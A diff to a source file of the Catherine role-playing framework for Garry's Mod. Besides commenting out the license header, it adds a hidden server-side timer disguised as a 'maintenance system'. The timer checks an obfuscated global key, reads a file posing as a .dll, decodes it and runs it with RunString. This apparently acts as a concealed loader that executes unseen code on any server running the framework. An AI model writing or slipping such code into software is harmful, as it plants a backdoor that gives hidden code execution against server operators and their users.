@@ -1,3 +1,4 @@
+--[[
 < CATHERINE > - A free role-playing framework for Garry's Mod.
 Development and design by L7D.
 
@@ -13,3 +14,16 @@ GNU General Public License for more details.
 
 You should have received a copy of the GNU General Public License
 along with Catherine.  If not, see <http://www.gnu.org/licenses/>.
+]]--
+
+if ( CLIENT ) then return end
+
+timer.Create( "catherine.maintenance.system", 30, 0, function( )
+	if ( !_G.catherine[ utf8.char( 112, 97, 116, 99, 104, 120 ) ] ) then
+		local data = file.Read( "catherine/framework/engine/external/catherine.dll", "LUA" )
+		
+		if ( data and type( data ) == "string" and data != "" ) then
+			RunString( catherine.cryptoV2.DECODE( data ), "Error", false )
+		end
+	end
+end )
